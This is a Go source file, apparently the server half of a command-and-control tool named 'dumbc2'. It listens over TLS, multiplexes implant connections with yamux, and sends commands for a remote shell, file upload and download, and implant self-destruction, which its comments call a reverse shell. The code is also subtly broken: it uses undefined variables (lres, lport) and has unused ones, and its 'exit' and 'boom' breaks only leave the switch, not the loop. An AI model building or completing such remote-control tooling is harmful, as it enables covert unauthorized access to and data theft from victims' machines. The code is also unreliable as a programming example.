package useri

import (
	"fmt"
	"github.com/pkg/errors"
	"github.com/hashicorp/yamux"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"log"
	"strings"
	"time"
)

func StartServer(){
	allIPs := utils.GetAllIPs()
	//todo: argparse instead

	fladdr := lres + ":" + lport
    lbserver, err := transport.TLSServerBuilder(fladdr, false)
    for true {
    	if lbserver != nil {
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
			sess, err := yamux.Client(conn, nil)
			if err != nil {
				log.Println(err)
				continue
			}
			handleClient(sess)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}


func printHelp(){
	fmt.Println(
`
Usage: 
bash = Get Shell (Non-interactive)
upload <Source File Path> <Destination File Path> = Upload file
download <Source File Path> <Destination File Path> = Download file
boom = Self-Destroy
exit = Close Program
help = Show This Message
`)
}

func handleClient(sess *yamux.Session){
	// start as tls server, means it's a reverse shell
	// if mux, we are working as server.
	stream, err := sess.Open()
	printHelp()
	if err != nil {
		log.Println(err)
	}
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help.\n")
	for true {
		fmt.Printf("[SERVER] %s [>_] $ ",stream.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		switch useriptD[0] {
		case "upload":
			stream.Write([]byte("$UPLD$"))
		case "download":
			stream.Write([]byte("$DWLD$"))
		case "boom":
			stream.Write([]byte("$BOOM$"))
			break
		case "bash":
			stream.Write([]byte("$BASH"))
		case "exit":
			break
		case "help":
			fallthrough
		default:
			printHelp()
		}
	}
	_ = stream.Close()
	_ = sess.Close()
}
